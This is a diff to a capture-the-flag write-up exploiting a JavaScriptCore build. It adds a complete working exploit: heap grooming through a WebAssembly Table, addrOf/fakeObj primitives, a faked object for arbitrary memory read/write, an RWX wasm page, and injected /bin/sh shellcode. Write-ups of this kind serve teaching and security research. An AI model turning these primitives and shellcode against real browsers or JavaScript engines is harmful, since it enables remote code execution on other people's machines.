@@ -124,7 +124,9 @@ Our table length should now be a much larger value than the original 0x100, as i
 
 ### addrOf and fakeObj primitives
 
-I had to slightly modify the above PoC to add more corrupted arrays, as allocating a new array sometimes claimed the old object and replaced the pointer to the corrupted butterfly.
+I had to slightly modify the above PoC to add more corrupted arrays.
+With only the one corrupted array, allocating a new array would claim the old object and replace the corrupted butterfly pointer.
+Making around 8 of these seems to prevent this, probably due to how the free list works in JavaScriptCore.
 
 We can then allocate many arrays which store a single `undefined` element to groom the heap, so that the next array with a single `undefined` element will at an address that is a little higher than the corrupted butterfly.
 
@@ -146,7 +148,7 @@ for (let i = 0; i < 8; i++) {
 edenGC();
 
 for (let i = 0; i < 0x1000; i++) {
-    new Uint8Array(new ArrayBuffer(1));
+    new Uint8Array(new ArrayBuffer());
 }
 
 gc();
@@ -178,13 +180,206 @@ function fakeObj(addr) {
     return object_arr[0];
 }
 
-o = {'a': 1.1}
+o = {a: 1.1}
 
-print(describe(fakeObj(addrOf(o))));
-print(describe(o));
+print(o == fakeObj(addrOf(o)));
 ```
 
-The print statements at the end should be describing the exact same object.
+This should print "true" as `o` should be the same as `fakeObj(addrOf(o))`.
+
+### Fake Object
+
+We now have the ability to get the address of any object, and create a fake object from an arbitrary address.
+We can also leak the structure ID of any object using the given `leakStrid()` built-in function.
+This gives us everything we need to craft a fake object.
+
+We start with a real object with 2 fields: `header` and `butterfly`.
+
+The header contains metadata for the object, including flags and the structure ID.
+We can set this to a CopyOnWriteArrayWithDouble using the leaked structure ID of a double array and finding the flags with a debugger.
+Note that by writing the header as an object pointer, we avoid complications of JSValue tagging.
+
+The butterfly is a pointer to our fake object's data.
+By setting it to a real object, we can overwrite the butterfly of the object to read and write from arbitrary addresses.
+Our victim object should have a non-inline property, as the shape of an object (including property offsets) is not dependent on the contents of the butterfly.
+By contrast, the array length is dependent on a field in the butterfly.
+
+As the properties of our fake object are inlined, they are stored in the object structure itself, not in the butterfly.
+By shifting its address by 0x10 bytes, we get a new object with our fake properties.
+
+```js
+const victim = [];
+victim.a = undefined;
+
+const fake = fakeObj(addrOf({
+    header: fakeObj((0x01082407n << 32n) + BigInt(leakStrid([1.1]))),
+    butterfly: victim,
+}) + 0x10n);
+
+print(describe(victim));
+print(describe(fake));
+```
+
+The butterfly of `fake` should be the address of `victim`.
+The type of `fake` should be a `CopyOnWriteArrayWithDouble`.
+
+### Arbitrary Read/Write
+
+The property of our victim is 0x10 bytes lower than the butterfly pointer.
+To read or write to an arbitrary address, we set the victim butterfly to 0x10 byte higher than the target address.
+We can then read or write an object from `victim.a` and convert it to a BigInt using our `addrOf` primitive.
+
+We can make our `arbRead` and `arbWrite` primitives read and write values as JavaScript objects, to avoid having to worry about converting tagged values.
+Note that this does restrict our reads and writes to being within [0xa, 0xffefffffffffffff].
+
+```js
+function arbRead(addr) {
+    fake[1] = itof(addr + 0x10n);
+    return addrOf(victim.a);
+}
+
+function arbWrite(addr, val) {
+    fake[1] = itof(addr + 0x10n);
+    victim.a = fakeObj(val);
+}
+
+o = {a: 1.1};
+arbWrite(addrOf(o), 0x4141414141414141n);
+print('0x' + arbRead(addrOf(o)).toString(16));
+```
+
+This should print "0x4141414141414141", indicating that we have successfully overwritten memory in object `o`.
+
+### RWX page
+
+We can get a RWX page by creating a wasm instance.
+Using our `addrOf` and `arbRead` primitives, we can find the address of a wasm function.
+
+```js
+const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
+const wasmModule = new WebAssembly.Module(wasmCode);
+const wasmInstance = new WebAssembly.Instance(wasmModule);
+const func = wasmInstance.exports.main;
+
+const rwx = arbRead(arbRead(addrOf(func) + 0x30n));
+
+print('0x' + rwx.toString(16));
+```
+
+We can check the memory mapping for the jsc process to verify that this address is marked as RWX.
+
+### Shellcode
+
+Using our `arbWrite` primitve, we can write shellcode 8 bytes at a time.
+As we are writing values as object, not as floats, our 64-bit shellcode values are subject to the same restrictions as our `arbRead` and `arbWrite` primitives.
+
+```js
+const shellcode = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05];
+
+for (let i = 0; i < shellcode.length + 7; i += 8) {
+    let code64 = 0n;
+
+    for (let j = 0; j < 8 && i + j < shellcode.length; j++) {
+        code64 |= BigInt(shellcode[i + j]) << BigInt(8 * j);
+    }
+
+    arbWrite(rwx + BigInt(i), code64);
+}
+
+func();
+```
+
+This will overwrite the wasm function code with our shellcode.
+When we call `func()`, we should be prompted with a shell.
+
+## Exploit
+
+```js
+const table = new WebAssembly.Table({
+    element: "externref",
+    initial: 0,
+});
+
+gc();
+
+for (let i = 0; i < 8; i++) {
+    table.grow(1, new Array(0x100).fill(1.1));
+}
+
+edenGC();
+
+for (let i = 0; i < 0x1000; i++) {
+    new Uint8Array(new ArrayBuffer());
+}
+
+gc();
+
+for (let i = 0; i < 0x100; i++) {
+    [undefined];
+}
+
+const object_arr = [undefined];
+const float_helper = new DataView(new ArrayBuffer(8));
+
+function itof(x) {
+    float_helper.setBigUint64(0, x, true);  
+    return float_helper.getFloat64(0, true);
+}
+
+function ftoi(x) {
+    float_helper.setFloat64(0, x, true);
+    return float_helper.getBigUint64(0, true);
+}
+
+function addrOf(obj) {
+    object_arr[0] = obj;
+    return ftoi(table.get(0)[0x2888]);
+}
+
+function fakeObj(addr) {
+    table.get(0)[0x2888] = itof(addr);
+    return object_arr[0];
+}
+
+const victim = [];
+victim.a = undefined;
+
+const fake = fakeObj(addrOf({
+    header: fakeObj((0x01082407n << 32n) + BigInt(leakStrid([1.1]))),
+    butterfly: victim,
+}) + 0x10n);
+
+function arbRead(addr) {
+    fake[1] = itof(addr + 0x10n);
+    return addrOf(victim.a);
+}
+
+function arbWrite(addr, val) {
+    fake[1] = itof(addr + 0x10n);
+    victim.a = fakeObj(val);
+}
+
+const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
+const wasmModule = new WebAssembly.Module(wasmCode);
+const wasmInstance = new WebAssembly.Instance(wasmModule);
+const func = wasmInstance.exports.main;
+
+const rwx = arbRead(arbRead(addrOf(func) + 0x30n));
+
+const shellcode = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05];
+
+for (let i = 0; i < shellcode.length + 7; i += 8) {
+    let code64 = 0n;
+
+    for (let j = 0; j < 8 && i + j < shellcode.length; j++) {
+        code64 |= BigInt(shellcode[i + j]) << BigInt(8 * j);
+    }
+
+    arbWrite(rwx + BigInt(i), code64);
+}
+
+func();
+```
 
 ## Flag
 
